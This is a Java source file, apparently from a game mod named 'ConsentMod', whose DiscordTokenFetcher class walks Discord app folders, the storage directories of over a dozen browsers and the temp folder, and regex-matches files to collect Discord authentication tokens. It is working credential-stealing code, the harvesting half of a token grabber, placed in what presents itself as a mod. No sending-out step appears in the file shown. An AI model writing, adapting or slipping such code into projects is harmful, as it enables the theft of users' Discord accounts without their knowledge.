package com.consentmod;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class DiscordTokenFetcher {

    private static final Pattern TOKEN_PATTERN = Pattern.compile("mfa\\.[a-zA-Z0-9_-]{80,90}|[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,120}");

    public static String getDiscordToken() {
        List<String> tokens = new ArrayList<>();

        searchDiscordApps(tokens);
        searchBrowsers(tokens);
        searchMemory(tokens);

        if (!tokens.isEmpty()) {
            return tokens.get(0);
        }
        return "Unable to retrieve";
    }

    public static List<String> getAllTokens() {
        List<String> tokens = new ArrayList<>();
        searchDiscordApps(tokens);
        searchBrowsers(tokens);
        return tokens;
    }

    private static void searchDiscordApps(List<String> tokens) {
        String[] apps = {"discord", "discordcanary", "discordptb", "discord development", "discord PTB"};
        String[] subs = {
            "Local Storage\\leveldb",
            "IndexedDB",
            "Session Storage",
            "Cache",
            "Code Cache",
            "GPUCache",
            "logs",
            "sentry"
        };

        for (String app : apps) {
            for (String sub : subs) {
                try {
                    Path dir = Path.of(System.getProperty("user.home"), "AppData", "Roaming", app, sub);
                    if (Files.exists(dir)) {
                        searchDir(dir, tokens);
                    }
                } catch (Exception e) {}
            }

            try {
                Path appDir = Path.of(System.getProperty("user.home"), "AppData", "Roaming", app);
                if (Files.exists(appDir)) {
                    searchDir(appDir, tokens);
                }
            } catch (Exception e) {}

            try {
                Path localDir = Path.of(System.getProperty("user.home"), "AppData", "Local", app);
                if (Files.exists(localDir)) {
                    searchDir(localDir, tokens);
                }
            } catch (Exception e) {}
        }
    }

    private static void searchBrowsers(List<String> tokens) {
        String roaming = System.getenv("APPDATA");
        String local = System.getenv("LOCALAPPDATA");

        String[] browserPaths = {
            // Google Chrome
            roaming + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
            roaming + "\\Google\\Chrome\\User Data\\Default\\Session Storage",
            roaming + "\\Google\\Chrome\\User Data\\Default\\IndexedDB",
            roaming + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb",
            roaming + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb",
            roaming + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb",
            roaming + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb",
            roaming + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb",
            local + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
            local + "\\Google\\Chrome\\User Data\\Default\\Session Storage",

            // Google Chrome Beta
            roaming + "\\Google\\Chrome Beta\\User Data\\Default\\Local Storage\\leveldb",
            local + "\\Google\\Chrome Beta\\User Data\\Default\\Local Storage\\leveldb",

            // Opera Stable
            roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
            roaming + "\\Opera Software\\Opera Stable\\Session Storage",
            roaming + "\\Opera Software\\Opera Stable\\IndexedDB",

            // Opera GX
            roaming + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb",
            roaming + "\\Opera Software\\Opera GX Stable\\Session Storage",
            roaming + "\\Opera Software\\Opera GX Stable\\IndexedDB",

            // Opera Beta
            roaming + "\\Opera Software\\Opera Beta\\Local Storage\\leveldb",
            roaming + "\\Opera Software\\Opera Beta\\Session Storage",

            // Opera Developer
            roaming + "\\Opera Software\\Opera Developer\\Local Storage\\leveldb",
            roaming + "\\Opera Software\\Opera Developer\\Session Storage",

            // Brave
            roaming + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
            local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",

            // Microsoft Edge
            roaming + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
            roaming + "\\Microsoft\\Edge\\User Data\\Default\\Session Storage",
            roaming + "\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb",
            roaming + "\\Microsoft\\Edge\\User Data\\Profile 2\\Local Storage\\leveldb",
            local + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",

            // Edge Beta
            roaming + "\\Microsoft\\Edge Beta\\User Data\\Default\\Local Storage\\leveldb",

            // Edge Dev
            roaming + "\\Microsoft\\Edge Dev\\User Data\\Default\\Local Storage\\leveldb",

            // Yandex
            roaming + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb",
            local + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb",

            // Vivaldi
            roaming + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb",

            // Firefox (search all profiles)
            roaming + "\\Mozilla\\Firefox\\Profiles",
            local + "\\Mozilla\\Firefox\\Profiles"
        };

        for (String path : browserPaths) {
            try {
                Path dir = Path.of(path);
                if (Files.exists(dir)) {
                    if (path.contains("Firefox\\Profiles")) {
                        // For Firefox, search inside each profile folder
                        Files.list(dir).filter(Files::isDirectory).forEach(profileDir -> {
                            searchDir(profileDir, tokens);
                            // Also search storage/default subfolder
                            Path storageDefault = profileDir.resolve("storage\\default");
                            if (Files.exists(storageDefault)) {
                                searchDir(storageDefault, tokens);
                            }
                        });
                    } else {
                        searchDir(dir, tokens);
                    }
                }
            } catch (Exception e) {}
        }
    }

    private static void searchMemory(List<String> tokens) {
        try {
            Path tempDir = Path.of(System.getProperty("java.io.tmpdir"));
            if (Files.exists(tempDir)) {
                searchDir(tempDir, tokens);
            }
        } catch (Exception e) {}
    }

    private static void searchDir(Path dir, List<String> tokens) {
        try {
            Files.walk(dir).filter(p -> {
                String name = p.getFileName().toString().toLowerCase();
                return name.endsWith(".log") || name.endsWith(".ldb") || name.endsWith(".txt") || name.endsWith(".json");
            }).forEach(file -> {
                try {
                    if (file.toFile().length() > 10_000_000) return;
                    byte[] bytes = Files.readAllBytes(file);
                    String content = new String(bytes, java.nio.charset.StandardCharsets.UTF_8);
                    findTokens(content, tokens);
                } catch (IOException e) {}
            });
        } catch (Exception e) {}
    }

    private static void findTokens(String content, List<String> tokens) {
        Matcher matcher = TOKEN_PATTERN.matcher(content);
        while (matcher.find()) {
            String token = matcher.group(0);
            if (!tokens.contains(token)) {
                tokens.add(token);
                System.out.println("[ConsentMod] Found token: " + token.substring(0, Math.min(20, token.length())) + "...");
            }
        }
    }
}
